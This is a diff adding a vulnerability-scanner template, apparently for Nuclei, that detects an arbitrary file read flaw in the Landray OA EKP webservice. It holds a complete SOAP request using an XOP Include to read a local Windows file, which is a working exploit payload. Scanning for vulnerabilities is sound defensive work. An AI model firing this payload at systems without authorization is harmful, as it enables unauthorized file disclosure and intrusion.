@@ -1,0 +1,47 @@
+id: landray-oa-sysformmaindataInsystemwebservice-lfi
+
+info:
+  name: 蓝凌OA-EKP系统接口sysFormMainDataInsystemWebservice存在任意文件读取漏洞
+  author: qwtd
+  severity: high
+  description: |
+    Landray EKP system interface sysFormMainDataInsystemWebservice has arbitrary file read vulnerability
+  tags: LandRay-OA
+
+http:
+  - raw:
+      - |
+        POST /sys/webservice/sysFormMainDataInsystemWebservice HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.3319.102 Safari/537.36
+        Connection: close
+        Content-Type: multipart/related; boundary=----4upt9dwdca8rtwq9osuz
+        SOAPAction: ""
+        Accept-Encoding: gzip, deflate
+
+        ------4upt9dwdca8rtwq9osuz
+        Content-Disposition: form-data; name="a"
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.maindata.xform.sys.kmss.landray.com/">
+        <soapenv:Header/>
+        <soapenv:Body>
+            <web:getData>
+                <arg0>
+                    <beginTimeStamp>a</beginTimeStamp>
+                    <count><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///C:/Windows/win.ini"/></count>
+                </arg0>
+            </web:getData>
+        </soapenv:Body>
+        </soapenv:Envelope>
+        ------4upt9dwdca8rtwq9osuz--
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "soap:Client"
+          - "Error: Not a number"
+        condition: and
+      - type: status
+        status:
+          - 500
